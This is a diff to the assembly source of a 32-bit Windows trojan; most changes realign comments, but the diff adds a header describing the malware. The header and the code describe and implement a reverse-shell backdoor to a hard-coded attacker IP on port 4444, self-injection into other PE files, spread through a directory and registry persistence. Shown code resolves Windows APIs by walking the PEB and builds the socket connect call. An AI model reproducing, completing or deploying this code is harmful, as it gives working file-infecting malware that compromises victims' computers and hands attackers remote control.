@@ -1,7 +1,12 @@
 ;-----------------------------------------------------------;
-; Author: Bach Ngoc Hung
+; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Setup the listener on port 4444 and change the ip address of the attack machine in the code first
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 448)
+; Version: 1.0
+; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
+; It can also add itself to the registry ke for persistence.
+; The injected file can also infect other files in the directory while avoiding inject to the infected files.
+;-----------------------------------------------------------;
 
 .386
 Option CaseMap:None
@@ -24,14 +29,14 @@ get_eip:
 	Rep Stosd
 	Cld
 
-	Mov [Ebp - 108H], Ebx		; This holds the address to the beginning of the payload
+	Mov [Ebp - 108H], Ebx			; This holds the address to the beginning of the payload
 	Mov [Ebp - 7CH], Esi
 	Mov Ax, 7373H
 	Push Eax
 	Push 65726464H
 	Push 41636F72H
 	Push 50746547H
-	Mov [Ebp - 14H], Esp		; Push GetProcAddress
+	Mov [Ebp - 14H], Esp			; Push GetProcAddress
 
 	Mov Eax, [Fs:30H]			; PEB
 	Mov Eax, [Eax + 0CH]			; PEB_LDR_DATA
@@ -88,10 +93,10 @@ getFunctionPosition:
 ; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
 getGetProcAddress:
 	Xor Ecx, Ecx
-	Mov Ecx, [Ebp - 10H]		; Address of ordinal table
+	Mov Ecx, [Ebp - 10H]			; Address of ordinal table
 	Mov Edx, [Ebp - 8H]			; Address of function
 
-	Mov Ax, [Ecx + Eax * 2]		; Get the function ordinal
+	Mov Ax, [Ecx + Eax * 2]			; Get the function ordinal
 	Mov Eax, [Edx + Eax * 4]
 	Add Eax, Ebx				; Function address
 	Jmp getFunctionAddress
@@ -102,15 +107,15 @@ getFunctionAddress:
 	Xor Ecx, Ecx
 	Xor Edx, Edx
 	Mov Esi, Eax				; Move GetProcAddress base to esi
-	Mov [Ebp - 14H], Esi		; Saving base address of GetProcAddress
+	Mov [Ebp - 14H], Esi			; Saving base address of GetProcAddress
 	Push Ecx
 	Push 41797261H				; aryA
 	Push 7262694CH				; Libr
 	Push 64616F4CH				; Load
 	Push Esp
 	Push Ebx
-	Call Esi					; Call GetProcAddress
-	Mov [Ebp - 18H], Eax		; Saving LoadLibraryA address
+	Call Esi				; Call GetProcAddress
+	Mov [Ebp - 18H], Eax			; Saving LoadLibraryA address
 
 	; Load CreateFileMappingA
 	Add Esp, 0CH
@@ -121,10 +126,10 @@ getFunctionAddress:
 	Push 614D656CH
 	Push 69466574H
 	Push 61657243H
-	Push Esp					; "CreateFileMappingA"
+	Push Esp				; "CreateFileMappingA"
 	Push Ebx
 	Call Esi
-	Mov [Ebp - 1CH], Eax				; Saving CreateFileMappingA address
+	Mov [Ebp - 1CH], Eax			; Saving CreateFileMappingA address
 
 	; Load CreateFile
 	Add Esp, 14H
@@ -132,23 +137,23 @@ getFunctionAddress:
 	Sub DWord Ptr [Esp + 3H], 61H
 	Push 69466574H
 	Push 61657243H
-	Push Esp					; "CreateFileA"
+	Push Esp				; "CreateFileA"
 	Push Ebx
-	Call Esi					; Call GetProcAddress
-	Mov [Ebp - 20H], Eax				; Saving CreateFile address
+	Call Esi				; Call GetProcAddress
+	Mov [Ebp - 20H], Eax			; Saving CreateFile address
 
 	; Load FindFirstFileA
-	Add Esp, 0CH					; Clear CreateFile from the stack
+	Add Esp, 0CH				; Clear CreateFile from the stack
 	Xor Ecx, Ecx
 	Mov Cx, 4165H
 	Push Ecx
 	Push 6C694674H
 	Push 73726946H
 	Push 646E6946H
-	Push Esp 					; "FindFirstFileA"
-	Push Ebx					; kernel32.dll base address
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 24H], Eax				; Saving FindFirstFileA address
+	Push Esp 				; "FindFirstFileA"
+	Push Ebx				; kernel32.dll base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 24H], Eax			; Saving FindFirstFileA address
 
 	; Get FindNextFileA address
 	Add Esp, 10H				; Clear FindFirstFileA from the stack
@@ -160,8 +165,8 @@ getFunctionAddress:
 	Push 646E6946H
 	Push Esp
 	Push Ebx
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 28H], Eax		; Saving FindNextFileA base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 28H], Eax			; Saving FindNextFileA base address
 
 	; Load SetFilePointer address
 	Add Esp, 10H
@@ -171,10 +176,10 @@ getFunctionAddress:
 	Push 746E696FH
 	Push 50656C69H
 	Push 46746553H
-	Push Esp					; "SetFilePointer"
+	Push Esp				; "SetFilePointer"
 	Push Ebx
-	Call Esi					; Call GetProcAddress
-	Mov [Ebp - 2CH], Eax		; Saving SetFilePointer address
+	Call Esi				; Call GetProcAddress
+	Mov [Ebp - 2CH], Eax			; Saving SetFilePointer address
 
 	; Load WriteFile address
 	Add Esp, 10H				; Clear "SetFilePointer"
@@ -183,10 +188,10 @@ getFunctionAddress:
 	Push Ecx
 	Push 6C694665H
 	Push 74697257H
-	Push Esp					; "WriteFile"
+	Push Esp				; "WriteFile"
 	Push Ebx
 	Call Esi
-	Mov [Ebp - 30H], Eax		; Saving WriteFile address
+	Mov [Ebp - 30H], Eax			; Saving WriteFile address
 
 	; Load lstrcpyA address
 	Add Esp, 0CH				; Clear WriteFile from the stack
@@ -194,19 +199,19 @@ getFunctionAddress:
 	Push Ecx
 	Push 41797063H
 	Push 7274736CH
-	Push Esp 					; "lstrcpyA"
+	Push Esp 				; "lstrcpyA"
 	Push Ebx
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 34H], Eax		; Saving lstrcpyA base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 34H], Eax			; Saving lstrcpyA base address
 
 	; Load lstrcmpA
 	Add Esp, 8H
 	Push 41706D63H
 	Push 7274736CH
-	Push Esp					; "lstrcmpA"
+	Push Esp				; "lstrcmpA"
 	Push Ebx
 	Call Esi
-	Mov [Ebp - 38H], Eax		; Saving lstrcmpA base address
+	Mov [Ebp - 38H], Eax			; Saving lstrcmpA base address
 
 	; Load GetModuleFileNameA
 	Add Esp, 8H
@@ -217,10 +222,10 @@ getFunctionAddress:
 	Push 6C694665H
 	Push 6C75646FH
 	Push 4D746547H
-	Push Esp					; "GetModuleFileNameA"
+	Push Esp				; "GetModuleFileNameA"
 	Push Ebx
 	Call Esi
-	Mov [Ebp - 3CH], Eax		; Saving GetModuleFileNameA base address
+	Mov [Ebp - 3CH], Eax			; Saving GetModuleFileNameA base address
 
 	; Load CreateProcessA
 	Add Esp, 0CH
@@ -233,7 +238,7 @@ getFunctionAddress:
 	Push Esp
 	Push Ebx
 	Call Esi
-	Mov [Ebp - 80H], Eax		; Saving CreateProcessA()
+	Mov [Ebp - 80H], Eax			; Saving CreateProcessA()
 
 	; Load WaitForSingleObject
 	Add Esp, 14H
@@ -245,10 +250,10 @@ getFunctionAddress:
 	Push 6C676E69H
 	Push 53726F46H
 	Push 74696157H
-	Push Esp					; WaitForSingleObject
+	Push Esp				; WaitForSingleObject
 	Push Ebx
 	Call Esi
-	Mov [Ebp - 84H], Eax		; Saving WaitForSingleObject()
+	Mov [Ebp - 84H], Eax			; Saving WaitForSingleObject()
 
 	; Load lstrlenA
 	Add Esp, 14H
@@ -256,7 +261,7 @@ getFunctionAddress:
 	Push Ecx
 	Push 416E656CH
 	Push 7274736CH
-	Push Esp					; "lstrlenA"
+	Push Esp				; "lstrlenA"
 	Push Ebx
 	Call Esi
 	Mov [Ebp - 40H], Eax
@@ -267,7 +272,7 @@ getFunctionAddress:
 	Push Ecx
 	Push 41746163H
 	Push 7274736CH
-	Push Esp					; "lstrcatA"
+	Push Esp				; "lstrcatA"
 	Push Ebx
 	Call Esi
 	Mov [Ebp - 44H], Eax
@@ -280,7 +285,7 @@ getFunctionAddress:
 	Push 6C694666H
 	Push 4F776569H
 	Push 5670614DH
-	Push Esp					; "MapViewOfFile"
+	Push Esp				; "MapViewOfFile"
 	Push Ebx
 	Call Esi
 	Mov [Ebp - 54H], Eax
@@ -291,7 +296,7 @@ getFunctionAddress:
 	Sub DWord Ptr [Esp + 3H], 61H
 	Push 636F7250H
 	Push 74697845H
-	Push Esp					; "ExitProcess"
+	Push Esp				; "ExitProcess"
 	Push Ebx
 	Call Esi
 	Mov [Ebp - 90H], Eax
@@ -301,7 +306,7 @@ getFunctionAddress:
 	Push 656C6946H
 	Push 664F646EH
 	Push 45746553H
-	Push Esp					; "SetEndOfFile"
+	Push Esp				; "SetEndOfFile"
 	Push Ebx
 	Call Esi
 	Mov [Ebp - 74H], Eax
@@ -309,14 +314,14 @@ getFunctionAddress:
 	; The returned data is saved to eax register
 	; Load ws2_32.dll using LoadLibraryA
 	Mov Eax, [Ebp - 18H]
-	Add Esp, 8H					; Clear lstrlenA from the stack
+	Add Esp, 8H				; Clear lstrlenA from the stack
 	Xor Ecx, Ecx
 	Mov Cx, 6C6CH				; ll
 	Push Ecx
 	Push 642E3233H				; 32.d
 	Push 5F327377H				; ws2_
-	Push Esp					; ws2_32.dll
-	Call Eax					; Call LoadLibraryA
+	Push Esp				; ws2_32.dll
+	Call Eax				; Call LoadLibraryA
 	Mov Ebx, Eax				; Move ws2_32 base address to ebx
 
 	; Get WSAStartup address
@@ -326,10 +331,10 @@ getFunctionAddress:
 	Push Ecx
 	Push 74726174H
 	Push 53415357H
-	Push Esp 					; WSAStartup
-	Push Ebx					; ws2_32.dll base address
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 88H], Eax		; Saving WSAStartup address
+	Push Esp 				; WSAStartup
+	Push Ebx				; ws2_32.dll base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 88H], Eax			; Saving WSAStartup address
 
 	; Get WSASocketA address
 	Add Esp, 0CH				; Clear WSAStartup from the stack
@@ -340,8 +345,8 @@ getFunctionAddress:
 	Push 53415357H
 	Push Esp
 	Push Ebx
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 8CH], Eax		; Saving WSASocketA base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 8CH], Eax			; Saving WSASocketA base address
 
 	; Get connect() base address
 	Add Esp, 0CH				; Clear WSASocketA from the stack
@@ -351,19 +356,19 @@ getFunctionAddress:
 	Push Ecx
 	Sub DWord Ptr [Esp + 3H], 61H
 	Push 6E6E6F63H
-	Push Esp 					; connect
-	Push Ebx					; ws2_32.dll base address
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 94H], Eax		; Saving connect() base address
+	Push Esp 				; connect
+	Push Ebx				; ws2_32.dll base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 94H], Eax			; Saving connect() base address
 
 	; Load Advapi32.dll using LoadLibraryA
 	Mov Eax, [Ebp - 18H]
-	Add Esp, 8H					; Clear connect() from the stack
+	Add Esp, 8H				; Clear connect() from the stack
 	Push 6C6C642EH
 	Push 32336970H
 	Push 61766441H
 	Push Esp
-	Call Eax					; Call LoadLibraryA
+	Call Eax				; Call LoadLibraryA
 	Mov Ebx, Eax				; Moving Advapi32.dll base address to ebx
 
 	; Get RegOpenKeyExA base address
@@ -376,9 +381,9 @@ getFunctionAddress:
 	Push 4B6E6570H
 	Push 4F676552H
 	Push Esp
-	Push Ebx					; Advapi32.dll base address
-	Call Esi					; GetProcAddress
-	Mov [Ebp - 98H], Eax		; Saving RegOpenKeyEx base address
+	Push Ebx				; Advapi32.dll base address
+	Call Esi				; GetProcAddress
+	Mov [Ebp - 98H], Eax			; Saving RegOpenKeyEx base address
 
 	; Get RegSetValueExA base address
 	Add Esp, 0CH				; Clearing the stack
@@ -444,15 +449,15 @@ reverse_shell:
 	Mov Eax, 0740A8C0H 				; 192.168.64.7
 	Push Eax
 	Mov Eax, 5C110102H
-	Dec Ah							; 5C110102 => 5C110002 (Remove 01)
+	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
 	Push Eax
 	Mov Esi, Esp
 	Xor Eax, Eax
 	Mov Ax, 10H
-	Push Eax						; namelen = 16 bytes
-	Push Esi						; *name: 5C110002
-	Push Ebx						; Arg 1(s): WSASocketA() Handler
-	Mov Eax, [Ebp - 94H]			; connect()
+	Push Eax					; namelen = 16 bytes
+	Push Esi					; *name: 5C110002
+	Push Ebx					; Arg 1(s): WSASocketA() Handler
+	Mov Eax, [Ebp - 94H]				; connect()
 	Call Eax
 
 	; Retrieve the path of the current process
